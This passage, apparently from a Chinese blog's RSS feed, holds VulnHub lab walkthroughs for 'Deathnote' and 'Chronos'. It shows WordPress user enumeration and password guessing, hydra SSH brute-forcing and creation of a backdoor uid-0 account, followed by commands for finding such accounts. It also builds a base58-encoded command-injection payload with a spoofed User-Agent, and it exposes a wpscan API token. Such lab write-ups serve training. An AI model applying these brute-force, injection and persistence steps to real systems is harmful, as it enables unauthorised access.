-l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-229.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.212&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.212 -oN /tmp/deathnote.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-230.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80&lt;/p&gt;
&lt;h3 id=&#34;wpscan-扫描-wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-扫描-wordpress&#34;&gt;#&lt;/a&gt; wpscan 扫描 wordpress&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjEyLw==&#34;&gt;http://192.168.31.212/&lt;/span&gt; 进行信息收集&lt;br&gt;
网页发生跳转，可直接修改本地 hosts 文件，改变 dns 解析&lt;br&gt;
 /etc/hosts 中添加 192.168.31.212 deathnote.vuln&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-231.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;网站是一个 wordpress 网站，可直接利用 wpscan 扫描&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过wpscan对网站的用户名进行枚举&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.212/wordpress/ --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-232.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到网站的用户名有 kira&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据用户名kira继续扫描密码看是否能扫到&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.212/wordpress/ -U kira -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 没有扫到用户 kira 的密码&lt;/p&gt;
&lt;p&gt;翻阅网站可点击的地方，找到一处提示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-233.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;根据提示，访问 http://192.168.31.212/notes.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-234.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有找到这个提示文件&lt;/p&gt;
&lt;p&gt;顺便访问一下爬虫协议的文件：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjEyL3JvYm90cy50eHQ=&#34;&gt;http://192.168.31.212/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-235.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据提示下载 jpg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://192.168.31.212/important.jpg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat important.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-236.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;新的提示，网站密码应该在网站的页面上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-237.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 发现疑似密码的字符串 iamjustic3&lt;/p&gt;
&lt;h3 id=&#34;wordpress-后台突破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-后台突破&#34;&gt;#&lt;/a&gt; wordpress 后台突破&lt;/h3&gt;
&lt;p&gt;可以使用 msf 直接 getshell，或者在后台寻找突破反弹 shell&lt;br&gt;
wordpress 的后台 wp-login：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjEyL3dvcmRwcmVzcy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.212/wordpress/wp-login.php&lt;/span&gt;&lt;br&gt;
 用户名 kira 密码 iamjustic3&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-238.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;翻阅后台文件，找到了 notes.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-239.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击进入到 notes.txt 可以找到这个文件的 url 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-240.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;下载到本地，查看此文件查询更多详细的信息&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat notes.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-241.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 SSH&lt;/h3&gt;
&lt;p&gt;发现是一个密码文件，尝试用 hydra 进行爆破 ssh 登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -l kira - P notes.txt ssh://192.168.31. 212 - f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-242.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 爆破失败，无法用用户 kira 登陆到此服务器&lt;/p&gt;
&lt;p&gt;前面得到一个线索 user.txt 中可能藏着一些敏感的用户&lt;br&gt;
此时我们已经拿到了后台的权限，可以访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy9ub3Rlcy50eHQ=&#34;&gt; http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt&lt;/span&gt;&lt;br&gt;
 获取到目标机器密码的列表，我们可以尝试访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy91c2VyLnR4dA==&#34;&gt; http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-243.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到了敏感的 user.txt 文件，可以用做 hydra 的爆破用户名的字典，可以将疑似网站用户的昵称提前，如在网站上看到的 kira，l&lt;br&gt;
 如果用户名刚好是这些，可以很快的提高爆破速度&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P notes.txt ssh://192.168.31. 212 -f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-244.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名 l 密码 death4me&lt;/p&gt;
&lt;h3 id=&#34;cyberchef-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cyberchef-解密&#34;&gt;#&lt;/a&gt; CyberChef 解密&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登陆到目标服务器&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh l@192.168.31.212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集服务器的相关信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/issue &amp;amp;&amp;amp; uname -a &amp;amp;&amp;amp; sudo -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-245.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户 l 在目标机器上没有 sudo 权限&lt;/p&gt;
&lt;p&gt;翻阅目录，找到了下面这个加密文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-246.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这是 brainfuck 加密，在线解密 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr&#34;&gt;https://ctf.bugku.com/tool/brainfuck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-247.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到提示，我们需要进入到 kira 用户里边，再次在目标服务器里边进行搜索，找到一个敏感目录 /opt/L&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-248.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在线解密 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;https://gchq.github.io/CyberChef/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-249.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 通过 magic 方法可破解得到密码 kiraisevil&lt;/p&gt;
&lt;p&gt;&lt;code&gt;su kira&lt;/code&gt;  切换到 kira 账户，sudo -l 查看相关权限设置&lt;br&gt;
发现该账户可以执行所有的 root 命令，直接 sudo su 切换到 root 账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-250.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;创建特权用户维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#创建特权用户维权&#34;&gt;#&lt;/a&gt; 创建特权用户维权&lt;/h3&gt;
&lt;p&gt;权限维持参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv&#34;&gt;https://bypass007.github.io/Emergency-Response-Notes/privilege/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个用户名X_T，密码 123456 的普通用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd -p `openssl passwd - 1 - salt &amp;#x27;salt&amp;#x27; 123456` X_T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个用户名kali，密码kali的root用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd -p `openssl passwd - 1 - salt &amp;#x27;salt&amp;#x27; kali` kali -o -u 0 -g root -G root -s /bin/bash -d /home/test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh X_T@192.168.31.212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su kali&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-251.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 每次都可以通过先登陆到 X_T 用户，再通过 su kali 切换到 root 账户&lt;/p&gt;
&lt;h3 id=&#34;可疑用户排查技巧&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可疑用户排查技巧&#34;&gt;#&lt;/a&gt; 可疑用户排查技巧&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查询特权用户特权用户(uid 为 0 )&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;awk -F: &amp;#x27;$3==0&amp;#123;print $1&amp;#125;&amp;#x27; /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查询可以远程登录的帐号信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;awk &amp;#x27;/\$1|\$6/&amp;#123;print $1&amp;#125;&amp;#x27; /etc/shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;除root帐号外，其他帐号是否存在sudo权限。如没有必要，普通帐号应删除sudo权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;more /etc/sudoers | grep -v &amp;quot;^#\|^$&amp;quot; | grep &amp;quot;ALL=(ALL)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-252.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 靶机攻击结束&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/113%20CHRONOS/</guid>
            <title>VULNHUB 13 CHRONOS</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/113%20CHRONOS/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2hyb25vcy0xLDczNS8=&#34;&gt;https://www.vulnhub.com/entry/chronos-1,735/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDExNDQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15801144.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 CHRONOS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-263.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.238&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.238 -oN /tmp/chronos.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-264.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 80, 8080&lt;/p&gt;
&lt;h3 id=&#34;js-代码美化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js-代码美化&#34;&gt;#&lt;/a&gt; js 代码美化&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM4Lw==&#34;&gt;http://192.168.31.238/&lt;/span&gt; 收集信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-265.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;审查源代码，发现一串敏感代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-266.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;https://gchq.github.io/CyberChef/&lt;/span&gt; 上进行 js 代码美化&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-267.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;复制代码，并且写到 kali 上，开启简易 web，在网站上浏览详细内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-268.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到了一个可疑的 url 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD00dWdZRHVBa1NjQ0c1Z01jWmpFTjNtQUx5RzFkRDVaWXNpQ2ZXdlEydzlhbllHeUw=&#34;&gt;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 可疑密文：4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-269.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;base58-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base58-解密&#34;&gt;#&lt;/a&gt; base58 解密&lt;/h3&gt;
&lt;p&gt;修改本地 hosts，访问此网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-270.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将可疑密文在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;https://gchq.github.io/CyberChef/&lt;/span&gt; 上进行解密，发现是 base58 加密&lt;br&gt;
 &lt;code&gt;&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;&lt;/code&gt; &lt;br&gt;
 即意味着服务上执行了 date ‘+Today is % A, % B % d, % Y % H:% M:% S.’&lt;br&gt;
想办法构造 payload 拼接此代码并进行加密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-271.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;date ‘+Today is %A, %B %d, %Y %H:%M:%S.’|ls&lt;br&gt;
 并且在 cyberchef 上进行 base58 加密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-272.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到密文：6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-273.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;访问 url 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD02bzRwVmZOdDV1NjhodktOckF5TnV5cjdhdDI1RGRtMThDRVptOEptWDJHWXlzTWI3V2Rn&#34;&gt;http://chronos.local:8000/date?format=6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;访问网址后并没有很明显的效果返回，利用 burp 做中间代理，拦截浏览器的数据，查看返回数据包，返回的是权限不足&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-274.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;修改 UA 头，将其改为网站 header 指向的 Chronos 重发数据包，返回数据成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-275.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;拼接linux命令反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拼接linux命令反弹&#34;&gt;#&lt;/a&gt; 拼接 linux 命令反弹&lt;/h3&gt;
